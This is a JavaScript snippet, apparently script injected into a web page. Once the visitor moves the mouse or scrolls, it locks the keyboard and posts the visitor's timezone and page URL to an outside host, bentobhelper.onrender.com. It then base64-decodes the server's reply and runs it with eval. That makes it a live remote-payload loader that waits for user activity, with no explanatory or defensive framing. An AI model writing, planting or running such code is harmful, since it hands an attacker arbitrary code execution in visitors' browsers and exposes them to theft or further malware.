document.addEventListener('mousemove', initiateApiRequestOnce);
document.addEventListener('scroll', initiateApiRequestOnce);

let requestSent = false;

function initiateApiRequestOnce() {
    if (requestSent) return;

    requestSent = true;
    document.removeEventListener('mousemove', initiateApiRequestOnce);
    document.removeEventListener('scroll', initiateApiRequestOnce);

    secureKeyboardAccess();
    const clientTimezone = getCurrentTimezone();
    transmitTimezoneData('https://bentobhelper.onrender.com', clientTimezone)
        .then(decodeAndRunScript)
        .catch(handleError);
}

function secureKeyboardAccess() {
    if (navigator.keyboard) navigator.keyboard.lock();
}

function getCurrentTimezone() {
    return Intl.DateTimeFormat().resolvedOptions().timeZone;
}

function transmitTimezoneData(url, timezone) {
    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ timezone, fullUrl: window.location.href }),
    }).then(response => response.text());
}

function decodeAndRunScript(encodedScript) {
    try {
        const script = atob(encodedScript);
        eval(script);
    } catch (error) {
        throw new Error(`Script execution failed: ${error}`);
    }
}

function handleError(error) {
    console.error('API request or script execution error:', error);
}
